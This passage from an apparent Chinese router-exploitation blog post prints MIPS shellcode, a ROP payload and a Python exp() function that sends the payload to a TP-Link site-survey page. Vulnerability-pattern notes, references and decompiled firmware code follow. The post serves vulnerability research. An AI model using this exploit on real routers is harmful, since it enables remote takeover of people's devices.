class="string">&quot;\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c&quot;</span></span><br><span class="line"></span><br><span class="line">s0=p32(<span class="number">0x11111111</span>)</span><br><span class="line">s1=p32(g2+libc_base) <span class="comment"># break </span></span><br><span class="line">s2=p32(sleep+libc_base)</span><br><span class="line"></span><br><span class="line">payload= <span class="string">&quot;/%0A&quot;</span>*<span class="number">0x55</span> +<span class="number">2</span>*<span class="string">&#x27;x&#x27;</span>+s0 +s1 +s2</span><br><span class="line">payload+=p32(g1+libc_base)  </span><br><span class="line">payload+=<span class="string">&#x27;x&#x27;</span>*<span class="number">28</span></span><br><span class="line">payload+=p32(g4+libc_base) <span class="comment">#s1</span></span><br><span class="line">payload+=p32(<span class="number">0x33333333</span>) <span class="comment">#s2</span></span><br><span class="line">payload+=p32(g3+libc_base) <span class="comment">#ra</span></span><br><span class="line">payload+=<span class="string">&#x27;x&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))&#125;</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">                <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssid&quot;</span>:urllib.unquote(payload)</span><br><span class="line">        &#125;</span><br><span class="line">    url=<span class="string">&quot;http://10.211.55.8:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">&quot;FMHSNOEAAJAKZBNA&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure>




<h2 id="对漏洞模式的探究"><a href="#对漏洞模式的探究" class="headerlink" title="对漏洞模式的探究"></a>对漏洞模式的探究</h2><ul>
<li><p>stringModify这样的漏洞应该很常见，Modify过程中的缓冲区溢出。</p>
<p>通过libfuzzer对Modify类的函数进行fuzz，测试\n等特殊字符之间的组合，测试是否包含转换过程中length错误导致的缓冲区溢出。</p>
<p>类似漏洞<a target="_blank" rel="noopener" href="https://warm-winter.github.io/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/">https://warm-winter.github.io/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</a></p>
</li>
<li><p>snprintf 参数size是格式化后的总长度，如果没有认识到这一点，就容易产生溢出。</p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tianxuhong/article/details/50974400">Linux系统调用Hook姿势总结</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203486">https://www.anquanke.com/post/id/203486</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=0_GsX2xhngU">https://www.youtube.com/watch?v=0_GsX2xhngU</a></p>
<p><a target="_blank" rel="noopener" href="https://ktln2.org/2020/03/29/exploiting-mips-router/">https://ktln2.org/2020/03/29/exploiting-mips-router/</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/314170234">https://zhuanlan.zhihu.com/p/314170234</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-212369.htm">https://bbs.pediy.com/thread-212369.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm">https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202219">https://www.anquanke.com/post/id/202219</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/">https://ctf-wiki.org/pwn/linux/mips/mips_rop/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA/">http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA/</a></p>
<hr>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><strong>UndefinedFunction_0045fa94</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UndefinedFunction_0045fa94</span><span class="params">(undefined4 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  <span class="keyword">short</span> sVar10;</span><br><span class="line">  <span class="keyword">uint32_t</span> uVar3;</span><br><span class="line">  <span class="keyword">uint32_t</span> uVar4;</span><br><span class="line">  <span class="keyword">uint32_t</span> uVar5;</span><br><span class="line">  <span class="keyword">uint32_t</span> uVar6;</span><br><span class="line">  undefined4 uVar7;</span><br><span class="line">  undefined1 *puVar8;</span><br><span class="line">  <span class="keyword">char</span> *pcVar9;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  uint uVar11;</span><br><span class="line">  uint uStack3624;</span><br><span class="line">  uint uStack3620;</span><br><span class="line">  uint uStack3616;</span><br><span class="line">  uint uStack3612;</span><br><span class="line">  uint uStack3608;</span><br><span class="line">  undefined4 uStack3604;</span><br><span class="line">  uint auStack3600 [<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> auStack3592 [<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack3576 [<span class="number">16</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack3560 [<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack3540 [<span class="number">20</span>];</span><br><span class="line">  undefined auStack3520 [<span class="number">24</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack3496 [<span class="number">36</span>];</span><br><span class="line">  <span class="keyword">char</span> acStack3460 [<span class="number">36</span>];</span><br><span class="line">  uint uStack3424;</span><br><span class="line">  uint uStack3420;</span><br><span class="line">  uint uStack3416;</span><br><span class="line">  uint uStack3412;</span><br><span class="line">  undefined4 uStack3408;</span><br><span class="line">  undefined4 uStack3404;</span><br><span class="line">  undefined4 uStack3400;</span><br><span class="line">  <span class="keyword">int</span> iStack3396;</span><br><span class="line">  undefined auStack3392 [<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> iStack3388;</span><br><span class="line">  <span class="keyword">int</span> iStack3384;</span><br><span class="line">  undefined auStack3364 [<span class="number">348</span>];</span><br><span class="line">  undefined uStack3016;</span><br><span class="line">  byte bStack3015;</span><br><span class="line">  byte abStack3013 [<span class="number">40</span>];</span><br><span class="line">  byte bStack2973;</span><br><span class="line">  ushort uStack2972;</span><br><span class="line">  byte abStack2970 [<span class="number">2906</span>];</span><br><span class="line">  undefined4 uStack64;</span><br><span class="line">  <span class="keyword">char</span> *pcStack60;</span><br><span class="line">  <span class="keyword">char</span> *pcStack56;</span><br><span class="line">  undefined *puStack52;</span><br><span class="line">  uint *puStack48;</span><br><span class="line">  uint *puStack44;</span><br><span class="line">  </span><br><span class="line">  uStack3624 = <span class="number">0</span>;</span><br><span class="line">  uStack3620 = <span class="number">0</span>;</span><br><span class="line">  uStack3616 = <span class="number">0</span>;</span><br><span class="line">  uStack3612 = <span class="number">0</span>;</span><br><span class="line">  uStack3608 = <span class="number">0</span>;</span><br><span class="line">  iVar1 = swGetBoardType(<span class="number">0</span>,param_1);</span><br><span class="line">  swWlanBasicCfgGet(<span class="number">0</span>,auStack3392);</span><br><span class="line">  swGetSystemMode(auStack3600);</span><br><span class="line">  httpStatusSet(param_1,<span class="number">0</span>);</span><br><span class="line">  httpHeaderGenerate(param_1);</span><br><span class="line">  iVar2 = HttpAccessPermit(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar2 = getRefererFlag();</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      sVar10 = HttpDenyPage(param_1);</span><br><span class="line">      <span class="keyword">goto</span> LAB_0045fa54;</span><br><span class="line">    &#125;</span><br><span class="line">    setRefererFlag(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;uStack3016,<span class="number">0</span>,<span class="number">0xb82</span>);</span><br><span class="line">  iVar2 = swGetBoardType();</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar2 = httpGetEnv(param_1,<span class="string">&quot;getWdsResult&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 != <span class="number">0</span>) &#123;</span><br><span class="line">      swWlanWDSScan(<span class="number">0</span>,&amp;uStack3016,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_0045eee4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(auStack3520,<span class="string">&quot;popupSiteSurveyRpm.htm&quot;</span>,<span class="number">0x17</span>);</span><br><span class="line">    uStack3604 = <span class="number">0x19</span>;</span><br><span class="line">    uStack64 = httpGetEnv(param_1,<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">    swGetLanCfg(auStack3592);</span><br><span class="line">    uVar3 = ntohl(auStack3592[<span class="number">0</span>]);</span><br><span class="line">    uVar4 = ntohl(auStack3592[<span class="number">0</span>]);</span><br><span class="line">    uVar5 = ntohl(auStack3592[<span class="number">0</span>]);</span><br><span class="line">    uVar6 = ntohl(auStack3592[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">sprintf</span>(acStack3576,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,uVar3 &gt;&gt; <span class="number">0x18</span>,uVar4 &gt;&gt; <span class="number">0x10</span> &amp; <span class="number">0xff</span>,(<span class="keyword">int</span>)(uVar5 &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>,</span><br><span class="line">            uVar6 &amp; <span class="number">0xff</span>);</span><br><span class="line">    swWlanWDSScan(<span class="number">0</span>,&amp;uStack3016,<span class="number">1</span>);</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;waitWdsInf&quot;</span>);</span><br><span class="line">    writePageParamSet(param_1,&amp;DAT_00544d38,auStack3520,<span class="number">0</span>);</span><br><span class="line">    writePageParamSet(param_1,&amp;DAT_00544d38,uStack64,<span class="number">1</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3604,<span class="number">2</span>);</span><br><span class="line">    writePageParamSet(param_1,&amp;DAT_00544d38,acStack3576,<span class="number">3</span>);</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    HttpWebV4Head(param_1,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    pcVar9 = <span class="string">&quot;/userRpm/WaitForWdsScanResult.htm&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    swWlanActivateScan(<span class="number">0</span>,&amp;uStack3016);</span><br><span class="line">LAB_0045eee4:</span><br><span class="line">    <span class="keyword">if</span> (auStack3600[<span class="number">0</span>] == <span class="number">4</span>) &#123;</span><br><span class="line">      iVar2 = <span class="number">1</span>;</span><br><span class="line">      iStack3388 = iStack3384;</span><br><span class="line">LAB_0045ef34:</span><br><span class="line">      <span class="keyword">if</span> (iStack3388 == iVar2) &#123;</span><br><span class="line">        uVar7 = wlanGetApDevName(<span class="number">0</span>);</span><br><span class="line">        swWlanInactiveVap(uVar7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (auStack3600[<span class="number">0</span>] &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (auStack3600[<span class="number">0</span>] == <span class="number">3</span>) &#123;</span><br><span class="line">LAB_0045ef20:</span><br><span class="line">          iVar2 = <span class="number">3</span>;</span><br><span class="line">          <span class="keyword">goto</span> LAB_0045ef34;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (auStack3600[<span class="number">0</span>] - <span class="number">6</span> &lt; <span class="number">3</span>) <span class="keyword">goto</span> LAB_0045ef20;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar11 = (uint)bStack3015;</span><br><span class="line">    uStack3608 = uVar11;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack3612 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack3612 &lt; (<span class="keyword">int</span>)uVar11) &#123;</span><br><span class="line">        uStack3620 = (uint)*(ushort *)(&amp;bStack2973 + uStack3612 * <span class="number">0x2e</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ((uStack3620 - <span class="number">0x34</span> &lt; <span class="number">0xd</span>) || (uStack3620 - <span class="number">100</span> &lt; <span class="number">0x29</span>)) &#123;</span><br><span class="line">          HTTP_DEBUG_PRINT(<span class="string">&quot;wireless/httpWlanCfg.c:190&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;**: filter out ap working on dfs chan(%d)\n&quot;</span>,uStack3620);</span><br><span class="line">          uStack3608 = uStack3608 - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        uStack3612 = uStack3612 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;siteSurveyPara&quot;</span>);</span><br><span class="line">    uStack3612 = <span class="number">2</span>;</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3612,<span class="number">0</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3608,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((auStack3600[<span class="number">0</span>] - <span class="number">7</span> &lt; <span class="number">2</span>) || (auStack3600[<span class="number">0</span>] == <span class="number">3</span>)) || (auStack3600[<span class="number">0</span>] == <span class="number">6</span>)) &#123;</span><br><span class="line">      puVar8 = (undefined1 *)httpGetEnv(param_1,&amp;DAT_005480cc);</span><br><span class="line">      <span class="keyword">if</span> (puVar8 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        puVar8 = &amp;DAT_00552af0;</span><br><span class="line">      &#125;</span><br><span class="line">      writePageParamSet(param_1,&amp;DAT_00544d38,puVar8,<span class="number">0</span>);</span><br><span class="line">      puVar8 = (undefined1 *)httpGetEnv(param_1,<span class="string">&quot;iSSID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (puVar8 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        puVar8 = &amp;DAT_00552af0;</span><br><span class="line">      &#125;</span><br><span class="line">      writePageParamSet(param_1,&amp;DAT_00544d38,puVar8,<span class="number">0</span>);</span><br><span class="line">      puVar8 = (undefined1 *)httpGetEnv(param_1,<span class="string">&quot;iWdsChan&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (puVar8 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        puVar8 = &amp;DAT_00552af0;</span><br><span class="line">      &#125;</span><br><span class="line">      writePageParamSet(param_1,&amp;DAT_00544d38,puVar8,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;mptBssid&quot;</span>);</span><br><span class="line">    uStack3612 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack3612 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">      writePageParamSet(param_1,&amp;DAT_00544d38,auStack3364 + uStack3612 * <span class="number">0x2c</span>,uStack3612);</span><br><span class="line">      uStack3612 = uStack3612 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;siteList&quot;</span>);</span><br><span class="line">    pcStack60 = acStack3560;</span><br><span class="line">    pcStack56 = acStack3540;</span><br><span class="line">    puStack52 = &amp;uStack3016;</span><br><span class="line">    uStack3612 = <span class="number">0</span>;</span><br><span class="line">    puStack48 = &amp;uStack3620;</span><br><span class="line">    puStack44 = &amp;uStack3616;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack3612 &lt; (<span class="keyword">int</span>)uVar11) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 != <span class="number">0</span>) ||</span><br><span class="line">         ((uStack3620 = (uint)*(ushort *)(&amp;bStack2973 + uStack3612 * <span class="number">0x2e</span> + <span class="number">1</span>),</span><br><span class="line">          <span class="number">0xc</span> &lt; uStack3620 - <span class="number">0x34</span> &amp;&amp; (<span class="number">0x28</span> &lt; uStack3620 - <span class="number">100</span>)))) &#123;</span><br><span class="line">        iVar2 = uStack3612 * <span class="number">0x2e</span>;</span><br><span class="line">        <span class="built_in">sprintf</span>(pcStack60,<span class="string">&quot;%02X-%02X-%02X-%02X-%02X-%02X&quot;</span>,(uint)abStack3013[iVar2],</span><br><span class="line">                (uint)abStack3013[iVar2 + <span class="number">1</span>],(uint)abStack3013[(uStack3612 * <span class="number">0x17</span> + <span class="number">1</span>) * <span class="number">2</span>],</span><br><span class="line">                (uint)abStack3013[iVar2 + <span class="number">3</span>],(uint)abStack3013[iVar2 + <span class="number">4</span>],</span><br><span class="line">                (uint)abStack3013[iVar2 + <span class="number">5</span>]);</span><br><span class="line">        <span class="built_in">strncpy</span>(pcStack56,pcStack60,<span class="number">0x12</span>);</span><br><span class="line">        writePageParamSet(param_1,&amp;DAT_00544d38,pcStack56,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(acStack3496,puStack52 + uStack3612 * <span class="number">0x2e</span> + <span class="number">10</span>,<span class="number">0x21</span>);</span><br><span class="line">        writePageParamSet(param_1,&amp;DAT_00544d38,acStack3496,<span class="number">1</span>);</span><br><span class="line">        uStack3624 = (uint)(&amp;bStack2973)[uStack3612 * <span class="number">0x2e</span>];</span><br><span class="line">        writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3624,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ((iVar1 == <span class="number">4</span>) || (iVar1 == <span 